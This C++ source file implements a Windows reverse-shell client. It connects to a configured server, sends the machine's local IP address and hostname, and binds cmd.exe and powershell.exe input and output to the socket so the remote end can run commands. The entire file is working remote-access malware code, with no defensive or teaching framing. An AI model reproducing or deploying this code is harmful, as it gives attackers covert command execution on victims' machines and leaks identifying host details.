#include "client.hpp"
#include "Process.hpp"

Client::Client(const char* chost, unsigned short int cport) {
    server = chost;
    port = cport;
}

void Client::create_socket() {
    printf("\ncreating socket\n");
    WSAStartup(MAKEWORD(2, 2), &wsaData); // initialize socket
    // create socket
    socket = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
    if (socket == INVALID_SOCKET) {
        printf("\nCould not create socket: %d", WSAGetLastError());
        closesocket(socket);
        WSACleanup();
    }
    return;
}

bool Client::connect_socket() {
    // declare connect type, host, port
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(server);

    // now connect
    printf("connecting socket\n");
    if (WSAConnect(socket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        printf("\nSocket connection error: %d", WSAGetLastError());
        //closesocket(socket); //dont close socket, otherwise recreation is needes
        return false;
    }
    else {
        try {
            //IPV4
            hostent* localHost = gethostbyname("");
            char* cli_ip = inet_ntoa(*(struct in_addr*)*localHost->h_addr_list);
            send(socket, cli_ip, BUFFER_SIZE, 0);

            // send hostname
            char hostname[100] = "";
            gethostname(hostname, sizeof(hostname));
            send(socket, hostname, BUFFER_SIZE, 0);
            printf("Addr info sent\n");
            return true;
        }
        catch (std::exception& e) {
            printf("\nUnable to send hostname or ip: %s", e);
            return true;
        }
    }
}

void Client::print_output(const char* output_str)
{
    TCHAR Npath[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, Npath);
    // creating string because of flexable APPEND functionality
    std::string msg = (LPCSTR)Npath;
    msg.append(output_str); msg.append("::>");
    send(socket, msg.c_str(), BUFFER_SIZE, 0);
    printf(output_str);
    return;
}


int Client::run_shell_commands(const char* cmd) {
    std::string Process = "powershell.exe -command \"";
    Process.append(cmd); Process.append("\"");
    
    STARTUPINFOA sinfo; // can specify window appearance and standard handles
    PROCESS_INFORMATION pinfo; // stores infomation about the process created
    
    // sinfo flags to create output handle to socket
    memset(&sinfo, 0, sizeof(sinfo)); // fill space / reset
    sinfo.cb = sizeof(sinfo); // structure size in bytes = the size of sinfo
    memset(&pinfo, 0, sizeof(pinfo));

    // instead of using console window buffer redirect hStd to HANDLE object
    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)socket;

    printf("%s\n", (LPCSTR)Process.c_str()); // check if the string is not fucked then run process
    CreateProcessA(NULL, (LPSTR)Process.c_str(), NULL, NULL, true, 0, NULL, NULL, &sinfo, &pinfo);    
    
    // wait for the command to finish then close process
    WaitForSingleObject(pinfo.hProcess, INFINITE);
    // clean up / close handles
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
    
    return 0; // go back to loop
}

int Client::receive_commands()
{
    while (1) {
        char Process[] = "cmd.exe";
        STARTUPINFOA sinfo;
        PROCESS_INFORMATION pinfo;
        memset(&sinfo, 0, sizeof(sinfo));
        sinfo.cb = sizeof(sinfo);
        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)socket;
        CreateProcessA(NULL, (LPSTR)Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
        WaitForSingleObject(pinfo.hProcess, INFINITE);
        CloseHandle(pinfo.hProcess);
        CloseHandle(pinfo.hThread);

        memset(rdata, 0, sizeof(rdata));
        DWORD dwSockRead = 0;
        dwSockRead = recv(socket, rdata, BUFFER_SIZE, 0);
        if ((int)dwSockRead == SOCKET_ERROR)
        {
            printf("read error: %d", WSAGetLastError());
            return 0;
        }
        if (strcmp(rdata, "exit\n") == 0) {
            exit(0);
        }
    }
}

/*
int Client::receive_commands() 
{
    ClientState st;
    ClientState* state = &st;
    state->bRunning = TRUE;
    state->client = socket;

    while (true) {
        StartProcessAsync(state);
        ReadFromSocket(state);

        CloseHandle(state->hProcRead);
        CloseHandle(state->hProcWrite);
        CloseHandle(state->hThread);
        CloseHandle(state->hProcess);

        WaitForSingleObject(g_hReadProcThread, INFINITE);
        break;
    }
    closesocket(state->client);
    closesocket(socket);
    WSACleanup();
    return 0;
}
*/

// only being used for main because...
// WSAStartup apparentally needs to count shit to clean
void Client::close_connection() {
    closesocket(socket);
    WSACleanup();
    return;
}
